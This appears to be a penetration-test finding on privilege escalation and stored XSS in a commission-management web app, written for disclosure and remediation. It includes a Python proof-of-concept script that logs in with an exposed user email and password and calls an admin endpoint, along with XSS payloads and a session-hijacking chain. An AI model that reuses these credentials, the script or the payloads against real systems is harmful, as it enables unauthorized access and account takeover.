# Critical Broken Access Control: Organization Users Have Admin Privileges and Stored XSS Vulnerabilities

**ID:** vuln-0004
**Severity:** CRITICAL
**Found:** 2026-02-26 12:15:04 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/account, /api/admin/menu-api-access/get-all
**Method:** GET
**CWE:** CWE-269
**CVSS:** 9.0

## Description

A critical broken access control vulnerability was discovered in the commission management application that allows Organization users to gain admin privileges and execute stored XSS attacks.

The vulnerability exists in the user account management system where:
1. Organization users are incorrectly assigned ROLE_ADMIN privileges in their all_authorities array
2. Organization users can access admin-only endpoints such as /api/admin/menu-api-access/get-all
3. Multiple stored XSS payloads exist in the all_authorities field and are rendered in the application UI
4. The all_authorities field discloses all available system roles, facilitating privilege escalation attacks

This vulnerability was discovered during horizontal access control testing when an Organization user (nlnarayana3858@gmail.com) was found to have ROLE_ADMIN privileges and could access admin endpoints.

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Privilege Escalation**: Gain full admin privileges by logging in as an Organization user
2. **Unauthorized Data Access**: Access sensitive admin-only functionality and data
3. **Stored XSS Attacks**: Execute arbitrary JavaScript in the context of other users' sessions
4. **Session Hijacking**: Steal session cookies and hijack user accounts
5. **System Compromise**: Gain complete control over the commission management system
6. **Data Breach**: Access confidential commission, payout, and organizational data
7. **Financial Fraud**: Manipulate commission calculations and payout processes

The business impact includes:
- Complete compromise of the commission management system
- Unauthorized access to sensitive financial data
- Potential for financial fraud and manipulation of commission calculations
- Reputational damage and loss of customer trust
- Regulatory compliance violations (GDPR, PCI-DSS, etc.)

## Technical Analysis

**Root Cause Analysis:**

1. **Privilege Assignment Failure**: The application incorrectly assigns ROLE_ADMIN privileges to Organization users. The all_authorities array for Organization users contains "ROLE_ADMIN" along with other admin-level roles.

2. **Access Control Bypass**: The application's access control mechanism fails to properly validate user roles when accessing admin endpoints. Organization users can successfully call /api/admin/menu-api-access/get-all and other admin endpoints.

3. **Stored XSS Vulnerabilities**: The all_authorities field is not properly sanitized, allowing malicious JavaScript payloads to be stored and executed when rendered in the application UI.

4. **Information Disclosure**: The all_authorities field discloses all available system roles, providing attackers with complete knowledge of the privilege model.

**Technical Details:**

- **Vulnerable Endpoint**: `/api/account` (returns user account information including authorities)
- **Admin Endpoint**: `/api/admin/menu-api-access/get-all` (accessible by Organization users)
- **Vulnerable Field**: `all_authorities` array in user account response
- **XSS Payloads Found**:
  - `"suma\" onmouseover=alert(1) \""`
  - `"<a href=\"https://www.sumasoft.com/\">CLICK ME</a>"`
  - `"<img src=x onmouseover=alert(1)>"`
  - `"VAPT TESTING"`

**Attack Flow:**
1. Attacker logs in as an Organization user
2. Attacker's session automatically has ROLE_ADMIN privileges
3. Attacker accesses admin endpoints to perform privileged actions
4. Stored XSS payloads execute when other users view the compromised account
5. Attacker can hijack sessions or perform actions on behalf of other users

## Proof of Concept

**Proof of Concept: Privilege Escalation and Stored XSS**

1. **Privilege Escalation Demonstration**:
   - Log in as Organization user: nlnarayana3858@gmail.com / User@1234
   - Access the account information endpoint: GET /api/account
   - Observe that the response contains "ROLE_ADMIN" in the all_authorities array
   - Access admin endpoint: GET /api/admin/menu-api-access/get-all
   - Observe successful response with admin menu data

2. **Stored XSS Demonstration**:
   - Log in as any user
   - Navigate to user profile or account settings
   - The stored XSS payloads in the all_authorities field execute when rendered
   - Example payload: `<img src=x onmouseover=alert(1)>` triggers when user hovers over UI elements

3. **Complete Attack Chain**:
   - Attacker logs in as Organization user
   - Attacker accesses admin functionality normally restricted to admins
   - Attacker views other users' data through admin interfaces
   - When other users view the attacker's profile, XSS payloads execute
   - Attacker steals session cookies or performs actions on behalf of victims

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"

# Organization user credentials (should NOT have admin privileges)
ORG_USER = "nlnarayana3858@gmail.com"
ORG_PASSWORD = "User@1234"

# Admin endpoint that should be restricted
ADMIN_ENDPOINT = f"{BASE_URL}/api/admin/menu-api-access/get-all"

def demonstrate_privilege_escalation():
    """Demonstrate that Organization users have admin privileges"""

    # Step 1: Authenticate as Organization user
    auth_url = f"{BASE_URL}/api/authenticate"
    auth_data = {
        "email": ORG_USER,
        "password": ORG_PASSWORD,
        "rememberMe": False
    }

    print("[+] Authenticating as Organization user...")
    auth_response = requests.post(auth_url, json=auth_data, verify=False)
    auth_token = auth_response.json().get("id_token")

    if not auth_token:
        print("[-] Authentication failed")
        return False

    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }

    # Step 2: Get account information to verify admin privileges
    print("[+] Checking account information for admin privileges...")
    account_url = f"{BASE_URL}/api/account"
    account_response = requests.get(account_url, headers=headers, verify=False)

    if account_response.status_code == 200:
        account_data = account_response.json()
        print(f"[+] User level: {account_data.get('level')}")
        print(f"[+] User authorities: {account_data.get('authorities')}")
        print(f"[+] All authorities (contains ROLE_ADMIN): {account_data.get('all_authorities')}")

        # Check if ROLE_ADMIN is present
        all_authorities = account_data.get('all_authorities', [])
        if "ROLE_ADMIN" in all_authorities:
            print("[!] CRITICAL: Organization user has ROLE_ADMIN privileges!")
        else:
            print("[-] ROLE_ADMIN not found in authorities")
            return False

        # Check for XSS payloads
        xss_payloads = [
            'suma" onmouseover=alert(1) "',
            '<a href="https://www.sumasoft.com/">CLICK ME</a>',
            '<img src=x onmouseover=alert(1)>'
        ]

        for payload in xss_payloads:
            if any(payload in str(auth) for auth in all_authorities):
                print(f"[!] CRITICAL: Found stored XSS payload: {payload}")

    # Step 3: Access admin endpoint (should be restricted)
    print("[+] Attempting to access admin endpoint...")
    admin_params = {
        "startRow": "0",
        "endRow": "25",
        "sortModel": "[]",
        "filterModel": "{}"
    }

    admin_response = requests.get(ADMIN_ENDPOINT, headers=headers, params=admin_params, verify=False)

    if admin_response.status_code == 200:
        print("[!] CRITICAL: Organization user can access admin endpoint!")
        print(f"[+] Admin endpoint response length: {len(admin_response.text)}")
        print("[+] Privilege escalation successful!")
        return True
    else:
        print(f"[-] Admin endpoint access failed: {admin_response.status_code}")
        return False

def demonstrate_xss_impact():
    """Demonstrate the impact of stored XSS vulnerabilities"""

    print("\n[+] Demonstrating stored XSS impact...")

    # The XSS payloads are already stored in the system
    # When rendered in the UI, they would execute as follows:

    xss_payloads = [
        {
            "payload": '<img src=x onmouseover=alert(1)>',
            "description": "This payload executes when user hovers over the element containing the authority"
        },
        {
            "payload": 'suma" onmouseover=alert(1) "',
            "description": "This payload executes when user interacts with the element containing the malformed authority"
        },
        {
            "payload": '<a href="https://www.sumasoft.com/">CLICK ME</a>',
            "description": "This payload creates a malicious link that could be used for phishing"
        }
    ]

    for xss in xss_payloads:
        print(f"[!] Stored XSS Payload: {xss['payload']}")
        print(f"    Impact: {xss['description']}")
        print(f"    Execution: When rendered in UI, this would execute arbitrary JavaScript")

    print("\n[+] Session hijacking scenario:")
    print("1. Attacker logs in as Organization user (with admin privileges)")
    print("2. Attacker's XSS payloads are stored in the all_authorities field")
    print("3. Admin user views attacker's profile or user list")
    print("4. XSS payload executes in admin's browser")
    print("5. Attacker steals admin session cookie")
    print("6. Attacker hijacks admin session and gains full control")

if __name__ == "__main__":
    print("=" * 60)
    print("CRITICAL BROKEN ACCESS CONTROL VULNERABILITY DEMONSTRATION")
    print("=" * 60)

    # Demonstrate privilege escalation
    privilege_escalation_success = demonstrate_privilege_escalation()

    # Demonstrate XSS impact
    demonstrate_xss_impact()

    print("\n" + "=" * 60)
    if privilege_escalation_success:
        print("VULNERABILITY CONFIRMED: Organization users have admin privileges")
        print("IMPACT: Complete system compromise possible")
    else:
        print("Vulnerability not confirmed in this test")
    print("=" * 60)
```

## Remediation

**Comprehensive Remediation Plan:**

1. **Immediate Actions:**
   - **Revoke Admin Privileges**: Immediately remove ROLE_ADMIN and other admin-level privileges from Organization and Client user accounts
   - **Clean XSS Payloads**: Remove all malicious XSS payloads from the all_authorities field in the database
   - **Restrict Admin Endpoints**: Implement proper access control to restrict admin endpoints to actual admin users only

2. **Short-Term Fixes:**
   - **Implement Role-Based Access Control (RBAC):**
     - Define clear role hierarchies and permissions
     - Implement proper role assignment and validation
     - Ensure Organization and Client users cannot be assigned admin roles
   - **Sanitize User Input:**
     - Implement input validation for all user-provided data
     - Sanitize the all_authorities field to prevent XSS
     - Use output encoding when rendering user data in the UI
   - **Fix Access Control Logic:**
     - Implement proper authorization checks on all admin endpoints
     - Use a centralized access control mechanism
     - Ensure access control is enforced at both the API and UI layers

3. **Long-Term Security Improvements:**
   - **Implement Principle of Least Privilege:**
     - Review all user roles and permissions
     - Ensure users only have the minimum privileges necessary
     - Implement regular permission reviews
   - **Implement Content Security Policy (CSP):**
     - Deploy CSP headers to mitigate XSS impact
     - Use nonce-based or hash-based CSP for dynamic content
   - **Implement Secure Development Practices:**
     - Conduct security code reviews
     - Implement security testing in CI/CD pipeline
     - Train developers on secure coding practices
   - **Implement Monitoring and Auditing:**
     - Log all privilege escalation attempts
     - Monitor for unusual access patterns
     - Implement alerts for admin endpoint access

4. **Specific Code Fixes:**
   ```csharp
   // Fix for role assignment - ensure Organization users cannot have admin roles
   public void AssignRoles(User user)
   {
       // Validate user type before assigning roles
       if (user.UserType == UserType.Organization || user.UserType == UserType.Client)
       {
           // Organization and Client users should only have non-admin roles
           user.Authorities = user.Authorities
               .Where(role => !IsAdminRole(role))
               .ToList();
       }

       // Save user with validated roles
       _userRepository.Save(user);
   }

   private bool IsAdminRole(string role)
   {
       return role == "ROLE_ADMIN" ||
              role.StartsWith("Admin") ||
              role.Contains("Approver") ||
              role.Contains("Reviewer");
   }

   // Fix for XSS vulnerability - sanitize all_authorities field
   public UserDto GetUserAccount(string userId)
   {
       var user = _userRepository.GetById(userId);

       // Sanitize all authorities to prevent XSS
       var sanitizedAuthorities = user.AllAuthorities
           .Select(authority => SanitizeHtml(authority))
           .ToList();

       return new UserDto
       {
           Id = user.Id,
           Login = user.Login,
           // ... other fields
           AllAuthorities = sanitizedAuthorities
       };
   }

   private string SanitizeHtml(string input)
   {
       // Use a proper HTML sanitizer library
       return HtmlSanitizer.Sanitize(input);
   }
   ```

5. **Verification Steps:**
   - Test that Organization and Client users cannot access admin endpoints
   - Verify that ROLE_ADMIN is not present in non-admin user accounts
   - Confirm that XSS payloads are properly sanitized
   - Test that admin endpoints return 403 Forbidden for non-admin users
   - Conduct penetration testing to verify fixes

